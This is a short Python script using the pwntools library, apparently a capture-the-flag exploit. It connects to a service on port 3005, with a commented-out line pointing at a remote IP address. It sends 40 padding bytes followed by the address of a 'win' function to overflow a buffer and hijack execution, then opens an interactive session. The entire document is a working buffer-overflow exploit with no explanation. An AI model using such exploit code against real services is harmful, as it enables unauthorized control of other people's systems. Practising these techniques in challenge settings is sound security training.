from pwn import *

port= 7000
#p = remote("143.198.78.138", 3005)
p = remote("localhost", 3005)

win = p64(0x4011a2)

p.sendline(b'A'*40 + win)
p.sendline(b'lmao')

p.interactive()

